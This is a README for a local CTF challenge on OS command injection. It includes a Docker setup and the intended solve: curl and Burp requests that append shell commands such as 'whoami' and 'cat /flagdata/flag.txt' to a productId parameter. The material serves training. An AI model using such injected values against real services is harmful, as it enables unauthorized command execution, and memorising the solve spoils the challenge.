# IITCTF — Professional OS Command Injection

## Run
```bash
docker compose up --build
```
Open `http://127.0.0.1:8080`.

## Intended solve
Normal:
```bash
curl "http://127.0.0.1:8080/stock?productId=10"
```

Test command injection:
```bash
curl --get "http://127.0.0.1:8080/stock"   --data-urlencode 'productId=10; whoami'
```

Expected identity:
```text
ctfuser
```

Discover/read the flag:
```bash
curl --get "http://127.0.0.1:8080/stock"   --data-urlencode 'productId=10; cat /flagdata/flag.txt'
```

The result contains:
```text
IITCTF{<random_value>}
```

## Persistent dynamic flag
The first container startup generates a random flag with Python `secrets`.
It is stored in the Docker volume `flag_data`, so normal restarts keep the
same flag. To intentionally generate a new flag:
```bash
docker compose down -v
docker compose up --build
```

## Burp
A representative request:
```http
GET /stock?productId=10%3B%20whoami HTTP/1.1
Host: 127.0.0.1:8080
```

This is intentionally vulnerable and should only be deployed as an isolated,
authorized CTF challenge.
